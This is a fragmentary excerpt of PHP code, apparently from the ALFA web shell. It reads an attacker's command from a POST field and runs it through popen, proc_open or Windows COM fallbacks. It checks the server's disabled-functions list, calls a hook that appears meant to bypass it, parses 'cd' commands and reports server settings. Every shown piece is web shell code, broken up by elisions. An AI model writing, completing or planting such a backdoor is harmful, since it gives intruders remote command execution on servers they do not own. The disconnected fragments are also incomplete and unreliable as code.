...
{
    $funcOk = function ($fn) {
        if (function_exists('geckoBypassFuncOk')) {
            return geckoBypassFuncOk($fn);
        }
        ...
        return !in_array(strtolower($fn), is_array($parts) ? $parts : array(), true);
    };
    ...
    $pipes = array();
    $process = @proc_open($full . ' 2>&1', $descriptors, $pipes, null);
    if (!is_resource($process)) {
        return array('output' => 'proc_open failed', 'exit_code' => 1, 'no_shell' => true);
    }
    @fclose($pipes[0]);
...
function _alfa_shell_func_ok($fn)
{
...
$parts = preg_split('/\s*,\s*/', strtolower($raw), -1, PREG_SPLIT_NO_EMPTY);
return !in_array($fn, is_array($parts) ? $parts : array(), true);
}
...
'popen' => function($c){
if(!_alfa_shell_func_ok('popen') || !function_exists('pclose')){
return '';
}
$f = @popen($c, 'r');
if(!is_resource($f)){
...
if(!_alfa_shell_func_ok('proc_open')){
return '';
}
$pipes = array();
$process = @proc_open($c, array(
array("pipe","r"),
array("pipe","w"),
array("pipe","w")
), $pipes, null);
...
foreach($methods as $fn => $cb){
if(!_alfa_shell_func_ok($fn)){
continue;
}
$try = $cb($cmd);
if(is_string($try) && strlen($try) > 0){
return $try;
}
}
if(class_exists('COM') && isset($GLOBALS['sys']) && $GLOBALS['sys']=='win'){
...
$quotes = (function_exists('get_magic_quotes_gpc') && PHP_VERSION_ID < 80000) ? @get_magic_quotes_gpc() : '0';if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
echo '<tr>
...
$alfa1 = isset($_POST['alfa1']) ? (string)$_POST['alfa1'] : '';
$current_path = '';
if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $alfa1, $match)){
if(empty($match[1])){
$match[1] = $match[2];
}
